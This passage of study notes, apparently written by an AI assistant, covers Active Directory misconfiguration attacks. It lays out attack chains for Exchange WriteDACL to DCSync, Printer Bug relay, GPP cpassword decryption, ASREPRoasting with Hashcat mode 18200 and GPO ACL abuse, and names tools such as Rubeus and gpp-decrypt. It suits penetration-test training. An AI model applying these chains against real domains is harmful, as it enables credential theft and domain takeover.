Understand permissions
      ↓
Identify abuse path
      ↓
Validate impact
      ↓
Privilege escalation / lateral movement
```

Examples:

### Exchange

```text
Exchange group
     ↓
WriteDACL
     ↓
DCSync
```

### Printer Bug

```text
MS-RPRN
     ↓
Forced authentication
     ↓
Relay
     ↓
LDAP / RBCD
```

### SYSVOL

```text
SYSVOL
     ↓
Script
     ↓
Password
     ↓
Credential reuse
```

### GPP

```text
GPP XML
     ↓
cpassword
     ↓
Decrypt
     ↓
Credential
```

### ASREPRoasting

```text
DONT_REQ_PREAUTH
     ↓
AS-REP
     ↓
Offline cracking
     ↓
Password
```

### GPO

```text
Weak GPO ACL
     ↓
WriteDACL / GenericWrite
     ↓
Modify GPO
     ↓
Affected hosts
     ↓
Privilege escalation
```

---

# 44. High-Value Things to Remember

## Exchange

```text
Exchange Windows Permissions
```

can be dangerous because members may have:

```text
WriteDACL
```

over the domain.

---

## Organization Management

```text
Organization Management
```

is an extremely powerful Exchange administrative group.

---

## PrivExchange

```text
PushSubscription
```

can be abused to force Exchange authentication.

---

## Printer Bug

Know:

```text
MS-RPRN
RpcOpenPrinter
RpcRemoteFindFirstPrinterChangeNotificationEx
```

and understand:

```text
Forced authentication → Relay
```

---

## MS14-068

Remember:

```text
Kerberos
PAC
Forged PAC
Privilege escalation
```

and that patching is the primary defense.

---

## LDAP Credential Exposure

Look for:

```text
LDAP credentials
Test Connection
TCP/389
Cleartext credentials
```

---

## DNS Enumeration

Tool:

```text
adidnsdump
```

Important option:

```text
-r
```

Purpose:

```text
Resolve unknown DNS records
```

---

## Description Field

Check:

```text
Description
Notes
```

for accidental credential exposure.

---

## PASSWD_NOTREQD

Remember:

```text
PASSWD_NOTREQD ≠ No Password
```

It means the normal password requirement may not apply.

---

## SYSVOL

Look for:

```text
.bat
.vbs
.ps1
.xml
```

especially scripts containing credentials.

---

## GPP

Important terms:

```text
cpassword
Groups.xml
Registry.xml
MS14-025
gpp-decrypt
gpp_password
gpp_autologin
```

---

## ASREPRoasting

Important terms:

```text
DONT_REQ_PREAUTH
AS-REP
Rubeus
Kerbrute
GetNPUsers.py
Hashcat
```

Hashcat mode:

```text
18200
```

---

## GPO Abuse

Look for:

```text
GenericWrite
WriteDACL
WriteOwner
```

Then determine:

```text
GPO → OU → Affected Computers
```

before assessing impact.

---

# 45. Quick Revision Table

|Technique|Main Weakness|Important Artifact|Potential Impact|
|---|---|---|---|
|Exchange abuse|Excessive Exchange permissions|Exchange groups / ACLs|Domain compromise|
|PrivExchange|Exchange authentication coercion|PushSubscription|Relay / privilege escalation|
|Printer Bug|MS-RPRN coercion|Print Spooler|Relay / DCSync / RBCD|
|MS14-068|Kerberos PAC validation flaw|PAC|Privilege escalation|
|LDAP credential sniffing|Weak application configuration|LDAP credentials|Foothold / credential access|
|AD DNS enumeration|Exposed DNS records|AD-integrated DNS|Host/service discovery|
|Description passwords|Poor AD documentation|Description/Notes|Credential access|
|PASSWD_NOTREQD|Unusual password policy|userAccountControl|Weak account|
|SYSVOL scripts|Credentials in scripts|`.vbs/.ps1/.bat`|Credential access|
|GPP passwords|Historical `cpassword`|XML files|Credential recovery|
|GPP Autologon|Stored autologon credentials|Registry.xml|Account compromise|
|ASREPRoasting|Disabled Kerberos pre-auth|AS-REP|Offline password cracking|
|GPO abuse|Weak GPO ACL|GPO|Lateral movement / privilege escalation|

---

# 46. Further Topics

The source recommends continuing with:

```text
Active Directory Certificate Services (AD CS) attacks
Kerberos Constrained Delegation
Kerberos Unconstrained Delegation
Kerberos Resource-Based Constrained Delegation (RBCD)
```

These are important advanced Active Directory topics.

The material also transitions toward:

```text
Attacking AD Trusts
```

which is a large and complex topic covered more deeply in later material.

---

# 47. Final Mental Model

When assessing an Active Directory environment, don't only ask:

> "What vulnerability is present?"

Also ask:

```text
Who has the permission?
        ↓
What object can they modify?
        ↓
What does that object control?
        ↓
Which users/computers are affected?
        ↓
Can the modification lead to authentication?
        ↓
Can authentication be relayed?
        ↓
Can credentials be obtained?
        ↓
Can privileges be escalated?
```

This mindset is the key lesson of **Miscellaneous Misconfigurations**.

The notes above preserve the source's major commands, terminology, attack chains, and examples rather than replacing them with unrelated material.

If you want, I can also turn these into a **clean PDF-style study sheet with diagrams, attack-flow illustrations, and a “commands to memorize” section**.